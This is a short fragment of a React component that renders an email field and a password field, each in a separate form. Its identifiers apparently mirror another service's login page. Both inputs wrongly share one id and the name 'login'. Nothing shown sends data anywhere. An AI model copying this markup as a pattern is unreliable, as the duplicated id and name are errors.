    ...
    return (
        <div className="d1">
            ...
            <div className="d2_2">
                ...
                <div className="d3_2">
                    <form className="f3_1">
                        <input type="text" data-t="field:input-login" dir="ltr" aria-invalid="false" autoCorrect="off" autoCapitalize="off" autoComplete="username" className="in3_1" id="passp-field-login" name="login" placeholder="Email" value={email} onChange={onEmailChange} />
                    </form>
                    <form className="f3_2">
                        <input type="password" data-t="field:input-login" dir="ltr" aria-invalid="false" autoCorrect="off" autoCapitalize="off" autoComplete="current-password" className="in3_1" id="passp-field-login" name="login" placeholder="Password" value={password} onChange={onPassChange} />
                    </form>
